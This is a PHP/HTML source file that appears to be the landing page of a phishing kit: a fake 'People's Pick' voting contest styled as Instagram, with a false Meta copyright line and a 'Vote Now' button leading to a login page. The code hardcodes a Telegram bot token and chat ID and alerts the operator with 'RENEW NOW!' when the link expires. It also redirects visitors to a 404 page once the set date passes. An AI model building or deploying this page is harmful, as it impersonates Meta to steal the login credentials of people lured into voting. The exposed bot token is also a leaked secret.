<?php
if (!file_exists('contestant_config.php') || time() - filemtime('contestant_config.php') > 300) {
    include 'sync_config.php';
}

session_start();

$configFiles = ['time.txt', 'telegram_chat_id.txt', 'image_config.php', 'contestant_config.php'];
foreach ($configFiles as $file) {
    if (!file_exists($file)) {
        die("Error: Configuration file '$file' not found.");
    }
}

if (!isset($_GET['t']) && !isset($_GET['r'])) {
    $originalUrl = '';
    $uniqueQueryString = 't=' . time();
    $newUrl = strpos($originalUrl, '?') === false 
        ? $originalUrl . '?' . $uniqueQueryString 
        : $originalUrl . '&' . $uniqueQueryString;
    header('Location: ' . $newUrl);
    exit();
}

$setDate = new DateTime(file_get_contents('time.txt'));
$currentTime = new DateTime('now');
$chatId = file_get_contents('telegram_chat_id.txt');
$botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';

$imageConfig = include('image_config.php');
$mainImage = $imageConfig['main_image'];

$contestantsData = include('contestant_config.php');
$mainContestant = $contestantsData['main_contestant'];
$otherContestants = $contestantsData['contestants'];

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

if ($currentTime > $setDate) {
    ob_start();
    sendTelegramMessage($botToken, $chatId, "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!");
    ob_end_clean();
    header('Location: 404');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The People's Pick: Online Voting</title>
    <meta property="og:title" content="THE PEOPLE'S PICK">
    <meta property="og:description" content="Online voting spectacle.">
    <meta property="og:image" content="<?php echo $mainImage; ?>">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const setDate = new Date("<?php echo $setDate->format('Y-m-d H:i:s'); ?>");
            const currentTime = new Date();
            
            if (currentTime > setDate) {
                window.location.href = '404';
            }
        });
    </script>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl overflow-hidden">
        <!-- Main Image -->
        <div class="relative">
            <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-64 object-cover">
            <div class="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent"></div>
            <h1 class="absolute bottom-4 left-4 text-white text-2xl font-bold">THE PEOPLE'S PICK</h1>
        </div>
        
        <!-- Content -->
        <div class="p-6">
            <!-- Contestant Info -->
            <div class="flex items-center mb-4">
                <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
                    <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
                    </svg>
                </div>
                <div class="ml-3">
                    <h2 class="text-lg font-semibold text-gray-900"><?php echo htmlspecialchars($mainContestant['name']); ?></h2>
                    <p class="text-sm text-gray-500"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes • #<?php echo htmlspecialchars($mainContestant['position']); ?></p>
                </div>
            </div>
            
            <!-- Message -->
            <p class="text-gray-600 text-sm mb-6 leading-relaxed">
                I need your support! Please vote and help me reach new heights in this competition.
            </p>
            
            <!-- Vote Button -->
            <a href="login.php" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-3 px-4 rounded-xl font-medium text-center block hover:from-pink-600 hover:to-purple-700 transition-all duration-200 shadow-lg">
                🗳️ Vote Now
            </a>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="fixed bottom-4 left-1/2 transform -translate-x-1/2">
        <p class="text-xs text-gray-400">© 2025 Meta</p>
    </div>
</body>
</html>
